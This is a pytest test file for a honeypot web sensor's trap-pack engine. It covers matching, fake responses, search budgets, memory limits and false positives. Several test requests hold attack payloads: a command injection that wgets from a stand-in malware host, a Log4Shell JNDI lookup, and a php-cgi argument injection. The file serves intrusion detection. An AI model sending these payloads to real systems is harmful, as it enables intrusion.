"""Trap pack engine of the web sensor (M37 phase 1): bundled packs, fixtures, matching, fake
answers, limits, cost and memory."""

from __future__ import annotations

import copy
import gc
import json
import logging
import random
import re
import statistics
import time
import tracemalloc
from collections.abc import Callable
from contextlib import AbstractAsyncContextManager
from datetime import date
from pathlib import Path
from typing import Any

import pytest
from conftest import Harness
from legacy_detect import LEGACY_SEVERE
from suckerpot_common import traps as fmt

from web_sensor import traps
from web_sensor.config import Config
from web_sensor.detect import Detector
from web_sensor.httpio import Request
from web_sensor.profile import build_profile
from web_sensor.site import Ctx, Site

REPO = Path(__file__).resolve().parents[3]
FIXTURES = REPO / "traps" / "fixtures"
PKG = Path(__file__).resolve().parent.parent / "web_sensor"
TODAY = date(2026, 11, 20)
StartWith = Callable[..., AbstractAsyncContextManager[Harness]]


def edgegate(**changes: Any) -> dict[str, Any]:
    """The design's example pack (fictional product and CVE)."""
    obj: dict[str, Any] = {
        "schema": "suckerpot-trap/1",
        "id": "acme-edgegate-cve-2026-55501",
        "version": 1,
        "engine": 1,
        "sensor": "web",
        "title": "Acme EdgeGate pre-auth command injection",
        "cve": ["CVE-2026-55501"],
        "disclosed": "2026-11-18",
        "product": {"vendor": "Acme", "name": "EdgeGate"},
        "tag": "acme-edgegate-rce",
        "traps": [
            {
                "id": "version-probe",
                "level": "probe",
                "match": {"method": ["GET", "HEAD"], "path": {"exact": "/api/v1/version"}},
                "outcome": {"flags": ["edgegate_probe"]},
                "respond": {
                    "kind": "php",
                    "status": 200,
                    "content_type": "application/json",
                    "headers": [["Cache-Control", "no-store"]],
                    "variants": [
                        '{"product":"EdgeGate","version":"7.2.{rand_int:1-4}","build":"{rand_hex:8}"}',
                        '{"product":"EdgeGate","version":"7.1.{rand_int:6-9}","build":"{rand_hex:8}"}',
                    ],
                },
            },
            {
                "id": "diag-rce",
                "level": "exploit",
                "match": {
                    "method": ["POST"],
                    "path": {"exact": "/api/v1/diag/ping"},
                    "needles": [
                        {"in": "body", "any": ["host="]},
                        {"in": "body", "any": [";w", ";c", "|s", "$("]},
                    ],
                },
                "outcome": {"flags": ["edgegate_rce"]},
                "respond": {
                    "kind": "php",
                    "status": 200,
                    "content_type": "application/json",
                    "variants": [
                        '{"status":"ok","target":"{echo:query:host}","rtt_ms":{rand_int:9-40}}'
                    ],
                },
            },
        ],
    }
    obj.update(changes)
    return obj


def trapset(*objs: dict[str, Any]) -> traps.TrapSet:
    return traps.TrapSet.from_packs([fmt.validate_pack(o) for o in objs])


def req(
    method: str = "GET",
    path: str = "/",
    query: str = "",
    body: bytes = b"",
    headers: list[tuple[str, str]] | None = None,
) -> Request:
    r = Request(method=method, target=path + (f"?{query}" if query else ""), path=path, query=query)
    r.headers = headers if headers is not None else [("Host", "192.0.2.10"), ("User-Agent", "t")]
    r.body = body
    r.finalize_headers()
    return r


# -- bundled packs ---------------------------------------------------------------------------


def test_bundled_packs_load_and_keep_the_severe_set() -> None:
    ts = traps.bundled()
    assert [p.id for p in ts.packs] == [
        "log4j-log4shell",
        "phpunit-eval-stdin",
        "router-boaform-gponform",
    ]
    assert ts.rejected == () and ts.size == 6
    # Converted traps observe only: no CVE claim, no fake answer.
    assert all(not t.claim_cve and t.respond is None for p in ts.packs for t in p.traps)
    det = Detector(Config())
    assert det.severe == LEGACY_SEVERE
    assert "phpunit_probe" not in det.severe


def test_builtin_flags_are_listed_in_the_shared_format() -> None:
    """Packs may not set a flag the sensor's code sets: the shared list must be complete."""
    found: set[str] = set()
    for path in sorted(PKG.rglob("*.py")):
        for line in path.read_text().splitlines():
            if "flags" in line or "Analysis(" in line:
                found.update(re.findall(r'"([a-z][a-z0-9_]{2,31})"', line))
    from web_sensor import detect

    found |= {f for _, f in detect._PATH_SIGNATURES} | {f for _, f in detect._BODY_PATTERNS}
    found -= {"flags", "cve", "traps", "php", "static", "error", "exploit", "autoindex", "phpinfo"}
    assert found <= fmt.WEB_BUILTIN_FLAGS, found - fmt.WEB_BUILTIN_FLAGS
    pack_flags = {f for p in traps.bundled().packs for t in p.traps for f in t.flags}
    assert not pack_flags & fmt.WEB_BUILTIN_FLAGS
    # M3: the converted flags are owned by their bundled pack, and no other pack may set them.
    owners = {f: p.id for p in traps.bundled().packs for t in p.traps for f in t.flags}
    assert dict(fmt.PACK_OWNED_FLAGS) == owners


def _fixture_cases() -> list[tuple[str, str]]:
    cases = []
    for d in sorted(FIXTURES.iterdir()):
        if d.name == "benign":
            cases += [("benign", p.name) for p in sorted(d.glob("*.http"))]
        else:
            cases += [(d.name, name) for name in json.loads((d / "expect.json").read_text())]
    return cases


def test_every_bundled_pack_has_fixtures() -> None:
    dirs = {d.name for d in FIXTURES.iterdir()}
    assert {p.id for p in traps.bundled().packs} <= dirs
    for d in FIXTURES.iterdir():
        if d.name != "benign":
            expect = json.loads((d / "expect.json").read_text())
            assert sorted(expect) == sorted(p.name for p in d.glob("*.http")), d.name
            assert any(k.startswith("exploit-") for k in expect) and any(
                k.startswith("benign-") for k in expect
            )


@pytest.mark.parametrize(("pack", "name"), _fixture_cases())
async def test_golden_fixture(harness: Harness, pack: str, name: str) -> None:
    raw = (FIXTURES / pack / name).read_bytes()
    resp = await harness.raw(raw, wait=0.5)
    assert resp.startswith(b"HTTP/1.1 ")
    events = await harness.events("http_request")
    assert len(events) == 1
    data = events[0].data
    hits = {f"{t['pack']}/{t['trap']}" for t in data.get("traps", [])}
    if pack == "benign":
        # The benign corpus: browsers, crawlers, monitoring, the site's own pages.
        levels = {t["level"] for t in data.get("traps", [])}
        assert "exploit" not in levels and data["cve"] == [], data.get("traps")
        return
    want = json.loads((FIXTURES / pack / "expect.json").read_text())[name]
    assert hits == set(want["hits"])
    assert set(want.get("flags", [])) <= set(data["flags"])
    assert data["cve"] == []  # converted packs claim nothing


# -- loading ---------------------------------------------------------------------------------


def _bundle(*packs: Any) -> bytes:
    return json.dumps({"schema": "suckerpot-traps/1", "seq": 0, "packs": list(packs)}).encode()


def test_invalid_pack_is_rejected_alone_with_a_log_line(caplog: pytest.LogCaptureFixture) -> None:
    bad = edgegate(id="bad-pack")
    bad["traps"][0]["outcome"]["flags"] = ["php2shell"]  # a built-in flag
    caplog.set_level(logging.INFO, "web_sensor.traps")
    ts = traps.load_bytes(_bundle(bad, edgegate()), today=TODAY)
    assert [p.id for p in ts.packs] == ["acme-edgegate-cve-2026-55501"]
    assert "trap pack rejected: id=bad-pack reason=schema" in caplog.text
    assert "php2shell" not in caplog.text  # id and reason only
    assert "trap packs loaded: 1 packs, 2 traps" in caplog.text


def test_bad_files_give_an_empty_set(tmp_path: Path, caplog: pytest.LogCaptureFixture) -> None:
    assert traps.load_bytes(b"{not json", today=TODAY).size == 0
    assert traps.load_file(tmp_path / "missing.json").size == 0
    big = tmp_path / "big.json"
    big.write_bytes(b" " * (fmt.MAX_BUNDLE_BYTES + 1))
    assert traps.load_file(big).size == 0
    assert "rejected: limits" in caplog.text and "missing or unreadable" in caplog.text


# -- matching --------------------------------------------------------------------------------


def _match(ts: traps.TrapSet, r: Request) -> set[str]:
    return {h.trap.id for h in Detector(Config(), ts).analyze(r, "192.0.2.1").trap_hits}


def test_match_conditions() -> None:
    base = edgegate()
    t = base["traps"][0]
    t["respond"] = copy.deepcopy(t["respond"])
    base["traps"] = [
        {**copy.deepcopy(t), "id": "m-prefix", "match": {"path": {"prefix": "/API/"}}},
        {**copy.deepcopy(t), "id": "m-suffix", "match": {"path": {"suffix": ".CGI"}}},
        {**copy.deepcopy(t), "id": "m-exact-case", "match": {"path": {"contains": "/Admin"}, "case": "exact"}},
        {**copy.deepcopy(t), "id": "m-query", "match": {"query_keys": ["Cmd", "x"]}},
        {**copy.deepcopy(t), "id": "m-header", "match": {"header_names": ["X-Edge-Token"]}},
        {**copy.deepcopy(t), "id": "m-method", "match": {"method": ["PUT"], "path": {"prefix": "/"}}},
        {**copy.deepcopy(t), "id": "m-hex", "match": {"needles": [{"in": "body", "any": ["hex:00ff"]}]}},
        {**copy.deepcopy(t), "id": "m-and", "match": {"needles": [{"in": "query", "any": ["aa"]}, {"in": "headers", "any": ["bb"]}]}},
    ]  # fmt: skip
    ts = trapset(base)
    assert _match(ts, req(path="/api/x")) == {"m-prefix"}
    assert _match(ts, req(path="/a/b.cgi")) == {"m-suffix"}
    assert _match(ts, req(path="/Admin")) == {"m-exact-case"}
    assert _match(ts, req(path="/admin")) == set()
    assert _match(ts, req(path="/%2541PI/x")) == {"m-prefix"}  # decoded twice, lowercased
    assert _match(ts, req(path="/q", query="CMD=1&x")) == {"m-query"}
    assert _match(ts, req(path="/q", query="cmd=1")) == set()
    hs = [("Host", "h"), ("x-edge-token", "1")]
    assert _match(ts, req(path="/q", headers=hs)) == {"m-header"}
    assert _match(ts, req("PUT", "/q")) == {"m-method"}
    assert _match(ts, req("put", "/q")) == set()  # methods are case-sensitive
    assert _match(ts, req("POST", "/q", body=b"a\x00\xffb")) == {"m-hex"}
    assert _match(ts, req(path="/q", query="aa=1")) == set()
    assert _match(ts, req(path="/q", query="aa=1", headers=[("X-B", "bb")])) == {"m-and"}


def test_search_budget_bounds_the_work_and_never_starves_unpathed_traps() -> None:
    """L2: a request crafted to match many path traps spends the shared budget; the traps the
    budget skipped are reported, and traps without a path still run on their own budget."""
    obj = edgegate()
    probe = obj["traps"][0]
    obj["traps"] = [
        {
            **copy.deepcopy(probe),
            "id": f"b{i}",
            "match": {"path": {"prefix": "/"}, "needles": [{"in": "blob", "any": [f"nope{i}-{n}" for n in range(16)]}]},
        }
        for i in range(15)
    ] + [
        {**copy.deepcopy(probe), "id": "unpathed", "match": {"needles": [{"in": "headers", "any": ["x-mark: yes"]}]}},
    ]  # fmt: skip
    ts = trapset(obj)
    a = Detector(Config(), ts).analyze(req(path="/x", headers=[("X-Mark", "yes")]), "192.0.2.1")
    assert ts.budget_exhausted == 1  # 240 distinct searches wanted, 96 allowed
    assert a.trap_budget == 15 - traps.MAX_SEARCHES // 16  # path traps that got no search
    assert [h.trap.id for h in a.trap_hits] == ["unpathed"]


async def test_budget_marker_reaches_the_event(start_with: StartWith) -> None:
    obj = edgegate()
    probe = obj["traps"][0]
    obj["traps"] = [
        {**copy.deepcopy(probe), "id": f"b{i}", "match": {"path": {"prefix": "/"}, "needles": [{"in": "blob", "any": [f"nope{i}-{n}" for n in range(16)]}]}}
        for i in range(10)
    ]  # fmt: skip
    async with start_with() as h:
        h.sensor.detector = Detector(h.cfg, trapset(obj))
        await h.raw(b"GET /x HTTP/1.1\r\nHost: 192.0.2.10\r\nConnection: close\r\n\r\n")
        data = (await h.events("http_request"))[0].data
        assert data["trap_budget"] == 10 - traps.MAX_SEARCHES // 16


# -- fake answers ----------------------------------------------------------------------------


async def test_fake_answer_end_to_end(start_with: StartWith) -> None:
    async with start_with() as h:
        h.sensor.detector = Detector(h.cfg, trapset(edgegate()))
        resp = await h.raw(
            b"GET /api/v1/version HTTP/1.1\r\nHost: 192.0.2.10\r\nConnection: close\r\n\r\n"
        )
        head, _, body = resp.partition(b"\r\n\r\n")
        assert head.startswith(b"HTTP/1.1 200 OK")
        assert b"X-Powered-By: PHP/8.3.6" in head and b"Cache-Control: no-store" in head
        assert head.endswith(b"Content-Type: application/json")
        doc = json.loads(body)
        assert doc["product"] == "EdgeGate" and len(doc["build"]) == 8
        assert doc["version"][:4] in ("7.2.", "7.1.")
        head_only = await h.raw(
            b"HEAD /api/v1/version HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
        )
        assert head_only.endswith(b"\r\n\r\n")
        body2 = b"host=192.0.2.10;wget http://malware.example.net/x"
        resp = await h.raw(
            b"POST /api/v1/diag/ping?host=192.0.2.5%3Cscript%3E HTTP/1.1\r\nHost: x\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "
            + str(len(body2)).encode()
            + b"\r\nConnection: close\r\n\r\n"
            + body2
        )
        doc = json.loads(resp.partition(b"\r\n\r\n")[2])
        assert doc["target"] == "192.0.2.5script"  # filtered echo: no markup
        events = await h.events()
        reqs = [e for e in events if e.type == "http_request"]
        assert "edgegate_probe" in reqs[0].data["flags"] and reqs[0].data["cve"] == []
        assert reqs[0].data["app"] == "trap"
        assert reqs[0].data["traps"] == [
            {
                "pack": "acme-edgegate-cve-2026-55501",
                "v": 1,
                "trap": "version-probe",
                "level": "probe",
            }
        ]
        rce = reqs[2].data
        assert {"edgegate_rce", "rce"} <= set(rce["flags"]) and rce["cve"] == ["CVE-2026-55501"]
        downloads = [e for e in events if e.type == "download_attempt"]
        assert any(d.data.get("url") == "http://malware.example.net/x" for d in downloads)
        assert h.sensor.detector.severe >= {"edgegate_rce"}


def _site(secret: bytes = b"x" * 32) -> Site:
    return Site(Config(), build_profile(secret, 1_790_000_000.0), "x")


def _ctx() -> Ctx:
    return Ctx("192.0.2.1", 40000, False, 80, 1_790_000_000.0)


def _answer(site: Site, ts: traps.TrapSet, r: Request) -> Any:
    a = Detector(Config(), ts).analyze(r, "192.0.2.1")
    return site.trap_outcome(r, _ctx(), a.trap_hits, ts.groups)


def test_reserved_paths_and_specificity() -> None:
    obj = edgegate()
    probe = obj["traps"][0]
    obj["traps"] = [
        {**copy.deepcopy(probe), "id": "login", "match": {"path": {"contains": "login.php"}}},
        {**copy.deepcopy(probe), "id": "login-pathneedle", "match": {"path": {"contains": "login.php"}, "needles": [{"in": "path", "any": ["/wp-login.php"]}]}},
        {**copy.deepcopy(probe), "id": "login-anyheader", "match": {"path": {"contains": "login.php"}, "needles": [{"in": "headers", "any": [": "]}]}},
        {**copy.deepcopy(probe), "id": "login-blob", "match": {"path": {"contains": "login.php"}, "needles": [{"in": "blob", "any": ["wp-login"]}]}},
        {**copy.deepcopy(probe), "id": "login-q", "match": {"path": {"exact": "/wp-login.php"}, "query_keys": ["edge"]}},
        {**copy.deepcopy(probe), "id": "broad", "match": {"path": {"contains": "/api/"}}},
        {**copy.deepcopy(probe), "id": "narrow", "match": {"path": {"exact": "/api/v1/version"}}},
        {**copy.deepcopy(probe), "id": "pfx-short", "match": {"path": {"prefix": "/api/"}}},
        {**copy.deepcopy(probe), "id": "pfx-long", "match": {"path": {"prefix": "/api/v2/"}}},
    ]  # fmt: skip
    ts = trapset(obj)
    site = _site()
    # M2: on a page the site serves, path, blob or generic header needles cannot take over.
    assert _answer(site, ts, req(path="/wp-login.php")) is None  # the site keeps its login page
    assert _answer(site, ts, req(path="/x/login.php")) is not None  # not a reserved path
    out = _answer(site, ts, req(path="/wp-login.php", query="edge=1"))
    assert out is not None and out.route.endswith("/login-q")
    assert _answer(site, ts, req(path="/api/v1/version")).route.endswith("/narrow")
    assert _answer(site, ts, req(path="/api/v2/x")).route.endswith("/pfx-long")
    assert _answer(site, ts, req(path="/x/api/")).route.endswith("/broad")


def test_answers_vary_per_install_and_follow_presence_and_persona() -> None:
    ts = trapset(edgegate())
    bodies = {
        _answer(_site(bytes([i]) * 32), ts, req(path="/api/v1/version")).resp.body for i in range(8)
    }
    assert len(bodies) == 8
    same = _site()
    assert (
        _answer(same, ts, req(path="/api/v1/version")).resp.body
        == _answer(same, ts, req(path="/api/v1/version")).resp.body
    )  # stable per install
    half = trapset(edgegate(presence=0.5))
    answering = sum(
        _answer(_site(bytes([i]) * 32), half, req(path="/api/v1/version")) is not None
        for i in range(40)
    )
    assert 8 < answering < 32
    # Detection does not depend on presence.
    for i in range(10):
        a = Detector(Config(), half).analyze(req(path="/api/v1/version"), "192.0.2.1")
        assert "edgegate_probe" in a.flags
    # One product per persona group and install.
    other = edgegate(id="other-gate", group="vpn-appliance")
    other["traps"][0]["match"]["path"] = {"exact": "/api/v1/version"}
    pair = trapset(edgegate(group="vpn-appliance"), other)
    winners = set()
    for i in range(20):
        a = Detector(Config(), pair).analyze(req(path="/api/v1/version"), "192.0.2.1")
        assert len(a.trap_hits) == 2  # both probes match: detection is everywhere
        out = _site(bytes([i]) * 32).trap_outcome(
            req(path="/api/v1/version"), _ctx(), a.trap_hits, pair.groups
        )
        assert out is not None
        winners.add(out.route)
    assert len(winners) == 2


def test_static_and_error_kinds_and_headers() -> None:
    obj = edgegate()
    obj["traps"][0]["respond"].update(
        kind="static",
        status=302,
        content_type="text/plain",
        headers=[["Location", "{base_url}/login"], ["Set-Cookie", "sid={rand_hex:16}; path=/"]],
        variants=["{site_title} {hostname} {server_ip} {year} {install_date} {date_http}"],
    )
    r = req(path="/api/v1/version", headers=[("Host", "shop.example")])
    r.host = "shop.example"
    out = _answer(_site(), trapset(obj), r)
    headers = dict(out.resp.headers)
    assert out.resp.kind == "static" and out.resp.status == 302
    assert headers["Location"] == "http://shop.example/login"
    assert "Last-Modified" in headers and "ETag" in headers and len(headers["Set-Cookie"]) == 28
    assert b"srv-web01" in out.resp.body and b"{" not in out.resp.body


# -- limits, cost and memory -----------------------------------------------------------------


def _full_objs(heavy: bool = True) -> list[dict[str, Any]]:
    """Packs that fill the load limits: every unpathed slot and distinct needle, then pathed
    traps. Heavy: 6 conditions of 16 needles each, until the compiled memory cap. Light: one
    condition of 4 needles each, until the 512 trap limit."""
    objs: list[dict[str, Any]] = []
    rnd = random.Random(7)

    def needle() -> str:
        return "".join(rnd.choice("abcdefghijklmnopqrstuvwxyz0123456789=;/") for _ in range(24))

    def base(pid: str, day: str, items: list[dict[str, Any]]) -> dict[str, Any]:
        return {
            "schema": "suckerpot-trap/1", "id": pid, "version": 1, "engine": 1, "sensor": "web",
            "title": pid, "cve": [], "disclosed": day, "product": {"vendor": "V", "name": "N"},
            "tag": pid, "traps": items,
        }  # fmt: skip

    for p in range(2):
        items = []
        for t in range(16):
            conds = [{"in": area, "any": [needle()]} for area in ("query", "path")]
            items.append(
                {
                    "id": f"u{t}",
                    "level": "exploit",
                    "match": {"needles": conds},
                    "outcome": {"flags": [f"full_u{p}"]},
                }
            )
        objs.append(base(f"unpathed-{p}", "2026-11-19", items))
    ops = ("exact", "prefix", "contains", "suffix")
    for p in range(40):
        items = []
        for t in range(16):
            op = ops[t % 4]
            value = {
                "exact": f"/full/{p}/{t}",
                "prefix": f"/full/{p}/",
                "contains": f"/c{p}x{t}/",
                "suffix": f".x{p}y{t}",
            }[op]
            areas = ("query", "body", "headers", "blob", "path", "body") if heavy else ("blob",)
            conds = [
                {"in": area, "any": [needle() for _ in range(16 if heavy else 4)]} for area in areas
            ]
            items.append(
                {
                    "id": f"t{t}",
                    "level": "probe",
                    "match": {"path": {op: value}, "needles": conds},
                    "outcome": {"flags": [f"full_{p}"]},
                }
            )
        objs.append(base(f"pathed-{p:02d}", "2026-10-01", items))
    return objs


def test_full_limits_memory_stays_under_the_cap() -> None:
    objs = _full_objs()
    gc.collect()
    tracemalloc.start()
    try:
        validated = [fmt.validate_pack(o) for o in objs]
        kept, dropped = fmt.select(validated, TODAY)
        ts = traps.TrapSet.from_packs(kept)
        del validated
        gc.collect()
        used, _ = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    estimate = sum(p.cost for p in kept)
    assert dropped, "the cap must be reached"
    assert sum(1 for p in kept if p.id.startswith("unpathed")) == 2
    assert estimate <= fmt.MAX_COMPILED and estimate > fmt.MAX_COMPILED * 0.9
    assert used <= estimate, (used, estimate)  # the estimate is an upper bound
    assert used <= fmt.MAX_COMPILED
    assert ts.size >= 300


def _cost_requests() -> list[Request]:
    rnd = random.Random(3)
    letters = "abcdefghijklmnopqrstuvwxyz0123456789=;/"

    def text(n: int) -> str:
        return "".join(rnd.choice(letters) for _ in range(n))

    contains = "".join(f"/c{p}x{t}/" for p in range(20) for t in range(2, 16, 4))
    out = [
        req(path="/"),
        req(path="/wp-login.php", query="redirect_to=%2Fwp-admin%2F"),
        req("POST", "/xmlrpc.php", body=text(4000).encode()),
    ]
    for i in range(60):
        heads = [("Host", "192.0.2.10"), ("User-Agent", text(200))] + [
            (f"X-{j}", text(1000)) for j in range(30)
        ]
        out.append(
            req(
                "POST",
                f"/full/{i % 20}/{i % 16}",
                query=text(4000),
                body=text(16000).encode(),
                headers=heads,
            )
        )
        out.append(
            req("POST", contains[:4000], query=text(4000), body=text(16000).encode(), headers=heads)
        )
        out.append(req("GET", f"/a.x{i % 20}y{(i * 4 + 3) % 16}", query=text(2000), headers=heads))
    return out


@pytest.mark.parametrize("heavy", [True, False])
def test_full_limits_cost_p99_under_2ms(heavy: bool) -> None:
    validated = [fmt.validate_pack(o) for o in _full_objs(heavy)]
    kept, _ = fmt.select(validated, TODAY)
    assert sum(len(p.traps) for p in kept) == (320 if heavy else fmt.MAX_TRAPS)
    full = Detector(Config(), traps.TrapSet.from_packs(kept))
    none = Detector(Config(), traps.TrapSet.empty())
    added: list[float] = []
    for r in _cost_requests():
        runs: dict[str, list[float]] = {"full": [], "none": []}
        for _ in range(5):
            for name, det in (("full", full), ("none", none)):
                start = time.perf_counter()
                det.analyze(r, "192.0.2.1")
                runs[name].append(time.perf_counter() - start)
        added.append(min(runs["full"]) - min(runs["none"]))
    p99 = statistics.quantiles(added, n=100)[98]
    assert p99 < 0.002, f"p99 added cost {p99 * 1000:.2f} ms"


def test_loader_applies_the_limits_to_the_bundled_file() -> None:
    data = _bundle(*_full_objs()[:12])
    assert len(data) <= fmt.MAX_BUNDLE_BYTES
    ts = traps.load_bytes(data, today=TODAY)
    assert 0 < ts.size <= fmt.MAX_TRAPS
    assert Detector(Config(), ts).traps is ts


# -- re-review: crafted worst case and the benign corpus --------------------------------------


def _degenerate_objs() -> list[dict[str, Any]]:
    """Packs at the limits whose needles are the worst case for a byte search ("aaa...b" over
    "aaa..."): every search scans the whole area at about 3 ns per byte."""

    def base(pid: str, items: list[dict[str, Any]]) -> dict[str, Any]:
        return {
            "schema": "suckerpot-trap/1", "id": pid, "version": 1, "engine": 1, "sensor": "web",
            "title": pid, "cve": [], "disclosed": "2026-11-19",
            "product": {"vendor": "V", "name": "N"}, "tag": pid, "traps": items,
        }  # fmt: skip

    objs = []
    for p in range(1):  # unpathed: as many header needles as the scan bound allows (15)
        items = [
            {"id": f"u{t}", "level": "probe", "outcome": {"flags": [f"deg_u{p}"]},
             "match": {"needles": [{"in": area, "any": ["a" * 200 + f"b{p}{t:02d}"]}
                                   for area in ("headers",)]}}
            for t in range(15)
        ]  # fmt: skip
        objs.append(base(f"deg-unpathed-{p}", items))
    for p in range(28):
        items = [
            {"id": f"t{t}", "level": "probe", "outcome": {"flags": [f"deg_{p}"]},
             "match": {"path": {"prefix": "/"},
                       "needles": [{"in": ("headers", "blob", "body")[t % 3],
                                    "any": ["a" * 200 + f"c{p}x{t}y{n}" for n in range(16)]}]}}
            for t in range(16)
        ]  # fmt: skip
        objs.append(base(f"deg-pathed-{p:02d}", items))
    return objs


def _crafted_request() -> Request:
    filler = "a" * 1000
    return req(
        "POST",
        "/" + "a" * 4000,
        query="a" * 4000,
        body=b"a" * 16000,
        headers=[("Host", "192.0.2.10"), ("User-Agent", "a" * 1000)]
        + [(f"X-{i}", filler) for i in range(31)],
    )


def _added_ms(ts: traps.TrapSet, r: Request, runs: int = 5) -> float:
    full, none = Detector(Config(), ts), Detector(Config(), traps.TrapSet.empty())
    times: dict[str, list[float]] = {"full": [], "none": []}
    for _ in range(runs):
        for name, det in (("full", full), ("none", none)):
            start = time.perf_counter()
            det.analyze(r, "192.0.2.1")
            times[name].append(time.perf_counter() - start)
    return (min(times["full"]) - min(times["none"])) * 1000


def test_crafted_worst_case_cost_is_bounded() -> None:
    """Re-review L6: an attacker who knows every needle fills each area with the byte pattern
    that makes each search slowest. The budget (96 + 64 searches, 512 KiB of haystack per class)
    bounds the work: about 1 MiB scanned at about 3 ns per byte, so near 3 ms. The bound below
    (5 ms) leaves room for a slower CI host."""
    validated = [fmt.validate_pack(o) for o in _degenerate_objs()]
    kept, _ = fmt.select(validated, TODAY)
    ts = traps.TrapSet.from_packs(kept)
    assert sum(1 for p in kept if p.id.startswith("deg-unpathed")) == 1
    crafted = _crafted_request()
    samples = [_added_ms(ts, crafted) for _ in range(20)]
    assert max(samples) < 5.0, samples
    assert statistics.quantiles(samples, n=100)[98] < 5.0
    # The bundled packs against a request crafted for their own needles.
    jndi = "${jndi" * 600
    bundled_req = req(
        "GET",
        "/vendor/phpunit" * 200,
        query=jndi[:4000],
        body=jndi.encode()[:16000],
        headers=[("Host", "192.0.2.10")] + [(f"X-{i}", jndi[:1000]) for i in range(31)],
    )
    assert max(_added_ms(traps.bundled(), bundled_req) for _ in range(20)) < 2.0


async def _parse(raw: bytes) -> Request | None:
    import asyncio
    import contextlib

    from web_sensor.httpio import ConnReader, HttpError

    reader = asyncio.StreamReader()
    reader.feed_data(raw)
    reader.feed_eof()
    cr = ConnReader(reader, Config())
    req_ = await cr.read_request(first=True)
    if req_ is not None:
        with contextlib.suppress(HttpError):
            await cr.read_body(req_)
    return req_


async def test_no_pack_answers_or_flags_an_exploit_on_the_benign_corpus() -> None:
    """Re-review M2(b): no responding trap of the repository's packs answers any request of the
    benign corpus, and no pack trap hits it at exploit level."""
    ts = traps.bundled()
    site = _site()
    files = sorted((FIXTURES / "benign").glob("*.http"))
    assert len(files) >= 50
    for path in files:
        r = await _parse(path.read_bytes())
        assert r is not None, path.name
        a = Detector(Config(), ts).analyze(r, "192.0.2.1")
        assert [h.trap.id for h in a.trap_hits if h.trap.level == "exploit"] == [], path.name
        assert a.cve == [], path.name
        assert site.trap_outcome(r, _ctx(), a.trap_hits, ts.groups) is None, path.name


# -- third review --------------------------------------------------------------------------------


def _filler_unpathed() -> list[dict[str, Any]]:
    """Unpathed packs at the load limits that sort before the bundled ones (ids "aaa-*", two
    conditions each), with needles that never match."""
    objs = []
    for p in range(2):
        # p=0: 12 two-condition traps searching the headers; together with p=1 they fill the
        # scan bound (12 x 38 KiB + 12 x 4 KiB, about 505 KiB of 512 KiB);
        # p=1: query and path needles up to the count limit.
        areas = ("headers", "path") if p == 0 else ("query", "path")
        items = [
            {"id": f"f{t}", "level": "probe", "outcome": {"flags": [f"fill_{p}"]},
             "match": {"needles": [{"in": a, "any": [f"zz{p}{t}-never-{a}"]} for a in areas]}}
            for t in range(12 if p == 0 else 6)
        ]  # fmt: skip
        objs.append(
            {
                "schema": "suckerpot-trap/1",
                "id": f"aaa-filler-{p}",
                "version": 1,
                "engine": 1,
                "sensor": "web",
                "title": "filler",
                "cve": [],
                "disclosed": "2026-11-19",
                "product": {"vendor": "V", "name": "N"},
                "tag": f"aaa-filler-{p}",
                "traps": items,
            }
        )
    return objs


def test_bundled_detection_survives_a_padded_request_and_filler_packs() -> None:
    """B1: with filler packs at the limits and a request whose headers are padded to 32 KiB, the
    bundled log4shell traps still run (they run first and outside the budget) and flag."""
    bundle_doc = json.loads(traps.BUNDLED.read_bytes())
    data = _bundle(*bundle_doc["packs"], *_filler_unpathed())
    ts = traps.load_bytes(data, today=TODAY)
    ids = [p.id for p in ts.packs]
    assert {"aaa-filler-0", "aaa-filler-1", "log4j-log4shell"} <= set(ids), ts.rejected
    pad = [(f"X-Pad-{i}", "p" * 1000) for i in range(32)]
    r = req(
        path="/", headers=[("Host", "192.0.2.10"), ("X-Api", "${jndi:ldap://192.0.2.7/a}"), *pad]
    )
    a = Detector(Config(), ts).analyze(r, "192.0.2.1")
    assert "log4shell" in a.flags and a.trap_budget == 0
    # Core packs run first.
    assert all(p.id in fmt.CORE_PACKS for p, _ in ts._traps[:6])


def _observer(area: str, needle: str) -> traps.TrapSet:
    obj = edgegate()
    obj["traps"] = [
        {"id": "obs", "level": "exploit", "outcome": {"flags": ["obs_hit"], "claim_cve": False},
         "match": {"needles": [{"in": area, "any": [needle]}]}}
    ]  # fmt: skip
    return trapset(obj)


def test_explicit_header_anchor_at_run_time() -> None:
    """F1 / L-a at run time: "\\n-agent: mozilla/5.0" matches only a header named "-agent";
    the same needle without the anchor is searched raw (and is weak as evidence)."""
    browser = req(headers=[("Host", "h"), ("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")])
    assert _match(_observer("headers", "\n-agent: mozilla/5.0"), browser) == set()
    assert _match(_observer("headers", "-agent: mozilla/5.0"), browser) == {"obs"}
    first = req(headers=[("X-Edge", "Mozilla/5.0 (x)"), ("Host", "h")])
    assert _match(_observer("headers", "\nx-edge: mozilla/5.0"), first) == {"obs"}  # first line


def test_explicit_param_anchor_at_run_time() -> None:
    """F2 / L-a at run time: "&og=admin" matches the key "og" only (also the first parameter);
    "allow_url_include=1" without the anchor also matches inside "-d allow_url_include=1"."""
    anchored = _observer("body", "&og=admin")
    assert _match(anchored, req("POST", "/q", body=b"log=admin&pwd=x")) == set()
    assert _match(anchored, req("POST", "/q", body=b"og=admin&pwd=x")) == {"obs"}
    assert _match(anchored, req("POST", "/q", body=b"a=1&og=admin")) == {"obs"}
    raw = _observer("query", "allow_url_include=1")
    php_cgi = req(
        path="/php-cgi/php-cgi.exe", query="-d allow_url_include=1 -d auto_prepend_file=php://input"
    )
    assert _match(raw, php_cgi) == {"obs"}
    strict = _observer("query", "&allow_url_include=1")
    assert _match(strict, php_cgi) == set()
    assert _match(strict, req(path="/x", query="a=b&allow_url_include=1")) == {"obs"}
    assert _match(strict, req(path="/x", query="allow_url_include=1")) == {"obs"}
